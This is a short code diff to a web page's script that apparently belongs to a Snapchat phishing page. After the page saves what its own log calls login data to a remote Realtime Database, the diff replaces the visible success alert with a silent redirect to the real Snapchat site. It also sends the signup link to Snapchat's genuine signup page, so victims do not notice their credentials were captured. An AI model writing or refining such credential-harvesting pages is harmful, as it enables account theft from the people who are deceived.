@@ -144,13 +144,19 @@
                 })
                 .then(() => {
                     console.log('User data saved to Realtime Database');
-                    // Show a success message or redirect
-                    alert('Login data saved successfully!');
+                    // Redirect to the Snapchat login page
+                    window.location.href = "https://www.snapchat.com";
                 })
                 .catch((error) => {
                     console.error('Error saving user data:', error);
-                    alert('Failed to save data. Please try again.');
                 });
+            });
+
+            // Handle the sign-up link click
+            document.querySelector('p a').addEventListener('click', (e) => {
+                e.preventDefault();
+                // Redirect to Snapchat sign-up page
+                window.location.href = "https://www.snapchat.com/signup";
             });
         };
     </script>
